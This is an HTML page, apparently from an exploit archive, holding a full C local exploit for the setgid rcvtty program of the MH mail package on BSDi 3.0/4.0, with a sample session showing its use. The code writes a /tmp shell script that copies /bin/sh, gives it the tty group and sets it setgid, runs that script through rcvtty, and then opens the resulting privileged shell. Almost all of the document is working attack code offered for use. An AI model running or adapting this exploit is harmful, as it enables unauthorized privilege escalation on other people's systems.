<html>
<head>
<title>BSDi 3.0 / 4.0 rcvtty[mh] Local Exploit</title>
<pre>
/*
   (BSDi3.0/4.0)rcvtty[mh] local exploit, by v9[v9@fakehalo.org].  this exploit
   is for the rcvtty of the mh package, which is setgid=4(tty) on BSDi.  this
   exploit gives you egid/group=4(tty) access.

   example:
   -------------------------------------------------
   bash-2.02$ id
   uid=101(v9) gid=100(user) groups=100(user)
   bash-2.02$ cc xrcvtty.c -o xrcvtty
   bash-2.02$ ./xrcvtty
   [ (BSDi3.0/4.0)rcvtty[mh] local exploit, by v9[v9@fakehalo.org]. ]
   
   [*] /usr/contrib/mh/lib/rcvtty appears to be setgid.
   [*] now making shell script to execute.
   [*] done, now building and executing the command line.
   [*] done, now checking for success.
   [*] success, /tmp/ttysh is now setgid.
   [*] finished, everything appeared to have gone successful.
   [?] do you wish to enter the sgidshell now(y/n)?: y
   [*] ok, executing shell(/tmp/ttysh) now.
   $ id
   uid=101(v9) gid=100(user) egid=4(tty) groups=4(tty), 100(user)
   $ 
   -------------------------------------------------

   info: findings and exploit by v9[v9@fakehalo.org].
*/

#define PATH		&quot;/usr/contrib/mh/lib/rcvtty&quot;	/* path to rcvtty. */
#define MAKESHELL 	&quot;/tmp/mksh.sh&quot;			/* tmpfile to exec. */
#define SGIDSHELL	&quot;/tmp/ttysh&quot;			/* gidshell location. */
#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;

main()
{
  char cmd[256],in[1];
  struct stat mod1,mod2;
  FILE *sgidexec;
  fprintf(stderr,&quot;[ (BSDi3.0/4.0)rcvtty[mh] local exploit, by v9[v9@fakehalo.org]. ]\n\n&quot;,PATH);
  if(stat(PATH,&amp;mod1)){
    fprintf(stderr,&quot;[!] failed, %s doesnt appear to exist.\n&quot;,PATH);
    exit(1);
  } else if(mod1.st_mode==34285){
    fprintf(stderr,&quot;[*] %s appears to be setgid.\n&quot;,PATH);
  } else {
    fprintf(stderr,&quot;[!] failed, %s doesn't appear to be setgid.\n&quot;,PATH);
    exit(1);
  }
  fprintf(stderr,&quot;[*] now making shell script to execute.\n&quot;);
  unlink(MAKESHELL);
  sgidexec=fopen(MAKESHELL,&quot;w&quot;);
  fprintf(sgidexec,&quot;#!/bin/sh\n&quot;);
  fprintf(sgidexec,&quot;cp /bin/sh %s\n&quot;,SGIDSHELL);
  fprintf(sgidexec,&quot;chgrp tty %s\n&quot;,SGIDSHELL);
  fprintf(sgidexec,&quot;chmod 2755 %s\n&quot;,SGIDSHELL);
  fclose(sgidexec);
  chmod(MAKESHELL,33261);
  fprintf(stderr,&quot;[*] done, now building and executing the command line.\n&quot;);
  snprintf(cmd,sizeof(cmd),&quot;echo yes | %s %s 1&gt;/dev/null 2&gt;&amp;1&quot;,PATH,MAKESHELL);
  system(cmd);
  unlink(MAKESHELL);
  fprintf(stderr,&quot;[*] done, now checking for success.\n&quot;);
  if(stat(SGIDSHELL,&amp;mod2)){
    fprintf(stderr,&quot;[!] failed, %s doesn't exist.\n&quot;,SGIDSHELL);
    exit(1);
  } else if(mod2.st_mode==34285){
    fprintf(stderr,&quot;[*] success, %s is now setgid.\n&quot;,SGIDSHELL);
  } else {
    fprintf(stderr,&quot;[!] failed, %s doesn't appear to be setgid.\n&quot;,SGIDSHELL);
    exit(1);
  }
  fprintf(stderr,&quot;[*] finished, everything appeared to have gone successful.\n&quot;);
  fprintf(stderr,&quot;[?] do you wish to enter the sgidshell now(y/n)?: &quot;);
  scanf(&quot;%s&quot;,in);
  if(strcmp(in,&quot;y&quot;)){
    printf(&quot;[*] ok, aborting execution, the shell is: %s.\n&quot;,SGIDSHELL);
  } else{
    printf(&quot;[*] ok, executing shell(%s) now.\n&quot;,SGIDSHELL);
    execl(SGIDSHELL,SGIDSHELL,0);
  }
  exit(0);
}


# milw0rm.com [2000-11-21]
</pre>
</html>

